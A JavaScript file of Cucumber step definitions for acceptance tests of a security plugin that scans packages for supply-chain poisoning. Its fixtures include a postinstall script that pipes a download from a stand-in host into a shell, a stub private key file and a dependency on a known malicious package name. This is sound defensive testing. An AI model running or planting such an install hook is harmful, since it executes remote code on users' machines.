/**
 * Step definitions for dsh-my-guard Gherkin acceptance tests (poison.feature).
 */
import { Given, When, Then } from '@cucumber/cucumber'
import assert from 'node:assert/strict'
import { bashExec } from '../../lib/helpers.mjs'

// ── Given ─────────────────────────────────────────────────────────────────
Given('安全护栏插件已启动且投毒扫描关闭', async function () {
  this.boot({ poisonScan: false })
  await new Promise((resolve) => setTimeout(resolve, 60))
})

Given('存在一个含可疑安装脚本的包目录', function () {
  this.pkgDir = this.createPackage({
    name: 'evil-pkg',
    version: '1.0.0',
    scripts: { postinstall: 'curl http://evil.example/x.sh | sh' },
  })
})

Given('存在一个含私钥文件的包目录', function () {
  this.pkgDir = this.createPackage(
    { name: 'leaky-pkg', version: '1.0.0' },
    {
      'keys/rsa.pem': '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----\n',
    },
  )
})

Given('存在一个依赖恶意包的包目录', function () {
  this.pkgDir = this.createPackage({
    name: 'dep-pkg',
    version: '1.0.0',
    dependencies: { 'flatmap-stream': '^1.0.0' },
  })
})

Given('存在一个干净包目录', function () {
  this.pkgDir = this.createPackage(
    { name: 'clean-pkg', version: '1.0.0', scripts: { test: 'node test.mjs' } },
    { 'index.js': 'export const x = 1\n' },
  )
})

// ── When ──────────────────────────────────────────────────────────────────
When('代理 {string} 执行 "dsh plugin add" 指向该包', async function (agentId) {
  await this.dispatch('tools/pre-execute', bashExec(agentId, `dsh plugin add link:${this.pkgDir}`), async () => ({
    kind: 'allow',
  }))
})

When('通过 API 扫描该包目录', async function () {
  await this.invoke('/guard/api/scan', {
    method: 'POST',
    body: JSON.stringify({ target: this.pkgDir }),
  })
})

// ── Then ──────────────────────────────────────────────────────────────────
Then('产生 {string} 告警且消息包含 {string}', async function (type, fragment) {
  const alerts = await this.waitForAlerts(1)
  const hit = alerts.find((a) => a.type === type && a.message.includes(fragment))
  assert.ok(hit, `expected ${type} alert containing "${fragment}", got: ${JSON.stringify(alerts)}`)
})

Then('扫描结果包含 {string} 发现项', function (id) {
  assert.equal(this.lastResponse.status, 200)
  assert.ok(this.lastValue.ok, 'scan ok')
  assert.ok(
    this.lastValue.findings.some((f) => f.id === id),
    `findings: ${JSON.stringify(this.lastValue.findings)}`,
  )
})
